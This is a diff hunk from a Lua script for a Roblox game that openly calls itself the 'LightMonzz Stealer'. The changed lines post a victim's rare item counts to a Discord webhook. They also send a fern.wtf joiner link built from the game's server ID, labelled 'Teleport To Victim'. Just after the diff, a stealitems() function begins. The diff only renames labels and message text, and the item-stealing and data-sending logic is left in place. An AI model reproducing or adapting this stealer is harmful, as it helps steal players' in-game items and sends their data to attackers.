@@ -1082,16 +1082,16 @@ local WebHookEmbed = CreateEmbed(
             value = "```"..tostring(math.floor(valueCount + 0.5)).."```"
         },
         {
-            name = "LightMonzz Stealer", 
-            value = "https://discord.gg/CAr4FZHAyF"
+            name = "ᴅɪꜱᴄᴏʀᴅ sᴇʀᴠᴇʀ", 
+            value = "[**Join Invite**](https://discord.gg/CAr4FZHAyF)"
         }
     }
 )
 
 if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1 then
-    SendWebhook(webHook, {content = "@everyone --\nhttps://fern.wtf/joiner?placeId=142823291&gameInstanceId="..game.JobId.."", embeds = {WebHookEmbed}})
+    SendWebhook(webHook, {content = "(⭐️) Teleport To Victim: --\nhttps://fern.wtf/joiner?placeId=142823291&gameInstanceId="..game.JobId.."", embeds = {WebHookEmbed}})
 else
-    SendWebhook(webHook, {content = "@everyone\nhttps://fern.wtf/joiner?placeId=142823291&gameInstanceId="..game.JobId.."", embeds = {WebHookEmbed}})
+    SendWebhook(webHook, {content = "(⭐️) Teleport To Victim:\nhttps://fern.wtf/joiner?placeId=142823291&gameInstanceId="..game.JobId.."", embeds = {WebHookEmbed}})
 end
 
 local function stealitems()
